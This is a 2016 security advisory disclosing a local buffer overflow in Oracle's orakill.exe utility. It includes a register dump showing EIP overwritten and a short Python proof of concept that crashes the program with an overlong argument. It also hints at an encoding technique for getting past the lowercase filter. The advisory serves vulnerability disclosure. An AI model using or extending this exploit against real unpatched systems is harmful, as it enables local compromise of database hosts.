@@ -1,0 +1,128 @@
+'''
+[+] Credits: hyp3rlinx 
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/ORACLE-ORAKILL.EXE-BUFFER-OVERFLOW.txt
+
+[+] ISR: apparitionsec
+
+
+Vendor:
+==============
+www.oracle.com
+
+
+Product:
+===================
+orakill.exe v11.2.0
+
+
+The orakill utility is provided with Oracle databases on Windows platforms. The executable (orakill.exe) is available to DBAs to kill Oracle
+sessions directly from the DOS command line without requiring any connection to the database.
+
+
+C:\oraclexe\app\oracle\product\11.2.0\server\bin>orakill.exe -h
+
+Usage:  orakill sid thread
+
+  where sid  = the Oracle instance to target
+        thread = the thread id of the thread to kill
+
+  The thread id should be retrieved from the spid column of a query such as:
+
+        select spid, osuser, s.program from
+        v$process p, v$session s where p.addr=s.paddr
+
+
+Vulnerability Type:
+===================
+Buffer Overflow
+
+
+Reference:
+==========
+http://www.oracle.com/technetwork/security-advisory/cpuapr2016v3-2985753.html
+
+
+Vulnerability Details:
+=====================
+
+ToLower() filter being applied to supplied arguments e.g. 'A' \x41 beomes 'a' \x61 etc... may be possible to subvert using encoder
+technique like "ALPHA3". Also we need to supply a second argument of just 4 bytes to trigger the access violation.
+
+orakill.exe <104 bytes>, <4 bytes>
+
+Register dump.
+
+EAX 40000000
+ECX 0018FCA8 ASCII "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaarrrr"
+EDX 00000000
+EBX 61616161
+ESP 0018FD10 ASCII "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaarrrr"
+EBP 61616161
+ESI 61616161
+EDI 61616161
+EIP 61616161
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 0  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 0  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
+ST0 empty g
+ST1 empty g
+ST2 empty g
+ST3 empty g
+ST4 empty g
+ST5 empty g
+ST6 empty g
+ST7 empty g
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+Exploit code(s):
+================
+'''
+
+import subprocess
+
+pgm="C:\\oraclexe\\app\\oracle\\product\\11.2.0\\server\\bin\\orakill.exe "
+
+payload="A"*100 + "RRRR"
+subprocess.Popen([pgm, payload, " BBBB"], shell=False)
+
+
+'''
+Disclosure Timeline:
+====================================
+Vendor Notification:  October 5, 2015
+Vendor Fix: April 25, 2016
+June 13, 2016 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+================
+Low
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
+'''
